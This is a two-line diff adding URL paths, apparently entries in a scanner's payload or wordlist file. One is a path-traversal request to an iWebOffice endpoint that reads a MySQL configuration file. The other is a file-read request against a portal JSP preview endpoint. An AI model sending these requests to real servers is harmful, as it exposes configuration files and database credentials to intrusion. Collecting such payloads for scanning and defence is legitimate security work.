@@ -1,0 +1,2 @@
+/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
+/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp
